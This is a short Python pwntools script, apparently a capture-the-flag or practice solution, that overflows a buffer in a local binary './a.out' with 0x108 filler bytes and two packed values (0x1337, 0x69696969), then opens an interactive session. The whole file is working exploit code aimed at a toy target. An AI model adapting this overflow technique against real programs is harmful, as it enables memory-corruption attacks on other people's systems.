# coding: utf-8
from pwn import *
def exploit():
    proc= process("./a.out")
    address= (0x110- 8)
    address_1= p32(0x1337)
    address_2= p32(0x69696969)
    p= b'a'*(address)+ address_1+ address_2
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
